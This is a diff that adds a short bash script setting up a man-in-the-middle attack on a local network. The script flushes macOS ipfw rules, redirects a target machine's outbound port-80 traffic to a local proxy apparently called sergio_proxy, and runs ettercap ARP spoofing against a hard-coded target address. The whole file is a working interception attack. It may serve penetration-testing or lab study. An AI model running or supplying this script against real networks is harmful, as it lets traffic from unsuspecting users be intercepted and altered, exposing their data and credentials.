@@ -1,0 +1,13 @@
+#!/bin/bash
+#
+# SCRIPT THAT SETS UP
+#   1) mitm attack by means of arp spoofing, using ettercap
+#   2) forwarding of traffic going out to :80 into sergio_proxy
+
+target=192.168.0.101
+
+# MAC OS X. Replace with rules such as iptables if on Linux
+sudo ipfw -q flush
+sudo ipfw add fwd 127.0.0.1,8081 tcp from $target to any 80 via en1
+
+sudo ettercap -Tq -i en1 -M arp:remote /$target/ //
